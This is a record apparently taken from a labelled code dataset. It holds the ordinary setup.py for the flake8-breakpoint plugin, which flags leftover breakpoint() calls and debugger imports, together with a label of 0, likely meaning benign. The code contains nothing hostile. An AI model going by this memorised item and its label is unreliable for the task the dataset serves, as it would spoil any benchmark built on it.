{"idx": "flake8-breakpoint-1.1.0", "func": "# -*- coding: utf-8 -*-\nfrom distutils.core import setup\n\npackages = \\\n['flake8_breakpoint']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8-plugin-utils>=1.0,<2.0']\n\nentry_points = \\\n{u'flake8.extension': ['B60 = flake8_breakpoint.plugin:BreakpointPlugin']}\n\nsetup_kwargs = {\n    'name': 'flake8-breakpoint',\n    'version': '1.1.0',\n    'description': 'Flake8 plugin that check forgotten breakpoints',\n    'long_description': '# flake8-breakpoint\\n\\n[![pypi](https://badge.fury.io/py/flake8-breakpoint.svg)](https://pypi.org/project/flake8-breakpoint)\\n[![Python: 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://pypi.org/project/flake8-breakpoint)\\n[![Downloads](https://img.shields.io/pypi/dm/flake8-breakpoint.svg)](https://pypistats.org/packages/flake8-breakpoint)\\n[![Build Status](https://travis-ci.org/Afonasev/flake8-breakpoint.svg?branch=master)](https://travis-ci.org/Afonasev/flake8-breakpoint)\\n[![Code coverage](https://codecov.io/gh/afonasev/flake8-breakpoint/branch/master/graph/badge.svg)](https://codecov.io/gh/afonasev/flake8-breakpoint)\\n[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://en.wikipedia.org/wiki/MIT_License)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)\\n\\nFlake8 plugin that check forgotten breakpoints.\\n\\n## Installation\\n\\n```bash\\npip install flake8-breakpoint\\n```\\n\\n## Errors\\n\\n* B601 builtin function \"breakpoint\" found\\n\\n```python\\ndef function():\\n    breakpoint()  # error!\\n```\\n\\n* B602 import of debug module found\\n\\n```python\\ndef function():\\n    import pdb  # error! or ipdb/pudb\\n```\\n\\n## License\\n\\nMIT\\n\\n## Change Log\\n\\nUnreleased\\n-----\\n\\n* ...\\n\\n1.1.0 - 2019-05-23\\n-----\\n\\n* update flask_plugin_utils version to 1.0\\n\\n1.0.0 - 2019-04-02\\n-----\\n\\n* initial\\n',\n    'author': 'Evgeniy Afonasev',\n    'author_email': 'ea.afonasev@gmail.com',\n    'url': 'https://pypi.org/project/flake8-breakpoint',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
